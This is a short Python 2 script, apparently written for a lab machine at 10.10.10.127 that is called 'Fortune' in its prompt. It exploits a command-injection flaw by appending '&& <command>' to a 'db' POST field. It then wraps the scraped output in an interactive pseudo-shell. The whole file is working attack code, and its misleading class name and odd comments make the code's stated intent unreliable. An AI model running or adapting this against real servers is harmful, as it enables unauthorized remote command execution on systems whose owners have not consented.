#coding:utf-8

import sys
import requests
import urllib
import threading
import socket

from bs4 import BeautifulSoup
from optparse import *

class dns_requests(threading.Thread):
	def __init__(self, interface="tun0", target_ip="10.10.10.127",
							post_data=None):
		'''
			I enter the parameters by default, and
			therefore to put the target and the interface
		'''
		threading.Thread.__init__(self)	
		self.target_ip = (target_ip)
		self.interface = (interface)
		self.post_data = (post_data)
		self.target_ip = ("http://%s/select" %(self.target_ip))

	def values_in_col(self, ExecutionCommand):
		'''
			The code that will be executed
			on the remote server.
		'''	
		self.post_data = "&& echo '/InvokeRequests' && %s" %(ExecutionCommand)
		self.post_data = {"db":self.post_data}

		try:
			InvokeRequests = requests.post(self.target_ip, data=self.post_data, timeout=15).text
			InvokeRequests = BeautifulSoup(InvokeRequests, "html5lib")
		except requests.exceptions.ConnectTimeout as ExportVariable:
			sys.exit(ExportVariable)

		# So I create a loop to have information about the command.
		# Additional information on the execution of the code.
	
		InvokesSearchs = InvokeRequests.find_all('pre')[0]
		InvokesSearchs = "".join(InvokesSearchs).split()[::-1]	

		RegexValueReqs = InvokesSearchs.index('/InvokeRequests')
		CountInvokeReq = len(InvokesSearchs)

		# I created a condition for reasons, to test the variables
		# and their type of variable, and then execute the commands below
		
		if isinstance(RegexValueReqs, int) and isinstance(CountInvokeReq, int):
			del InvokesSearchs[RegexValueReqs:CountInvokeReq]
			print " ".join(InvokesSearchs)

	def __str__(self):
		'''
			Specifically, in this function,
			there would be code execution.
		'''
		while True:
			ExecutionCommand = raw_input('\033[42m[fortune_cmd]$> \033[0m ')
			if ExecutionCommand == ""     : continue 
			if ExecutionCommand == "quit" : sys.exit(0)
			if ExecutionCommand != ""     : self.values_in_col(ExecutionCommand)

if __name__ == "__main__":
	req = dns_requests()
	req.__str__()
